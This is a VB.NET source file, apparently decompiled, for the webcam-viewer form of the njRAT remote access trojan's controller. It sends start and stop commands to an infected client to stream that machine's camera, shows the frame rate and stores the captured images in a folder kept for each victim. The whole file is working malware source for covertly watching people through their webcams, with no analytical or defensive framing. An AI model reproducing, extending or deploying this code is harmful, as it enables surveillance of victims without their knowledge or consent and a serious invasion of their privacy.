Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Cam
    Inherits Form
    ' Methods

    Public folder As String
    Public fps As Integer
    Private int_0 As Integer
    Public osk As Client
    Public pkt As Integer
    Public QQ As String
    Public sk As Client
    Public Sub New()
        Me.fps = 0
        Me.int_0 = 0
        Me.QQ = String.Empty
        Me.folder = String.Empty
        Me.InitializeComponent()
    End Sub

    Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            If Me.sk.CN Then
                Me.sk.Send("@")
            End If
            Me.sk.CN = False
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub Cam_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.QQ = Conversions.ToString(Class7.smethod_1(Me.osk.L))
            Me.Text = Me.QQ
            Me.ComboBox2.SelectedIndex = 3
            Me.vmethod_6.Enabled = True
            Me.folder = (Me.osk.Folder & "Cam\")
            If Not Directory.Exists(Me.folder) Then
                Directory.CreateDirectory(Me.folder)
            End If
            Try
                Me.ComboBox2.SelectedIndex = Class7.class8_0.int_0
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Me.ComboBox2.SelectedIndex = 3
                ProjectData.ClearProjectError()
            End Try
            If Class7.class8_0.bool_7 Then
                Me.Button1.Text = "Stop"
                Me.sk.Send(String.Concat(New String() {"!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text}))
            End If
        Catch exception3 As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles vmethod_6.Tick
        Me.vmethod_6.Enabled = False
        Try
            If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
                Me.Close()
                Return
            End If
            If (Not Me.osk.CN Or Not Me.sk.CN) Then
                Me.Close()
            End If
        Catch exception1 As Exception
        End Try
        Me.int_0 = Me.fps
        If (Me.int_0 = 0) Then
            Me.pkt = 0
            Me.PictureBox1.Invalidate()
        End If
        Me.fps = 0
        Me.vmethod_6.Enabled = True
    End Sub

    Private Sub PictureBox1_Paint(sender As Object, e As PaintEventArgs) Handles PictureBox1.Paint
        Try
            Dim text As String = (Conversions.ToString(Me.int_0) & "fps" & ChrW(13) & ChrW(10) & Class6.smethod_17(CLng(Me.pkt)))
            Dim size As Size = TextRenderer.MeasureText([text], New Font(Me.Font, FontStyle.Bold))
            Dim rect As New Rectangle(0, 0, size.Width, size.Height)
            e.Graphics.FillRectangle(Brushes.Black, rect)
            Dim red As Brush = Brushes.Red
            If (Me.int_0 > 3) Then
                red = Brushes.YellowGreen
            End If
            If (Me.int_0 > 6) Then
                red = Brushes.LimeGreen
            End If
            e.Graphics.DrawString([text], New Font(Me.Font, FontStyle.Bold), red, CSng(0.0!), CSng(0.0!))
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If (Me.Button1.Text = "Start") Then
                Me.Button1.Text = "Stop"
                Me.sk.Send(String.Concat(New String() {"!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text}))
            Else
                Me.Button1.Text = "Start"
                Me.sk.Send("@")
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If Me.CheckBox3.Checked Then
            Try
                Process.Start(Me.folder)
            Catch exception1 As Exception

            End Try
        End If
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If (Me.Button1.Text = "Stop") Then
            NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() {Operators.ConcatenateObject((("!" & Class7.string_1) & Conversions.ToString(Me.ComboBox1.SelectedIndex) & Class7.string_1), Me.ComboBox2.SelectedItem)}, Nothing, Nothing, Nothing, True)
        End If
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
        If (Me.Button1.Text = "Stop") Then
            NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() {Operators.ConcatenateObject((("!" & Class7.string_1) & Conversions.ToString(Me.ComboBox1.SelectedIndex) & Class7.string_1), Me.ComboBox2.SelectedItem)}, Nothing, Nothing, Nothing, True)
        End If
    End Sub

    Private Sub Timer1_Tick_1(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.ProgressBar1.Value = Me.sk.rp
    End Sub
End Class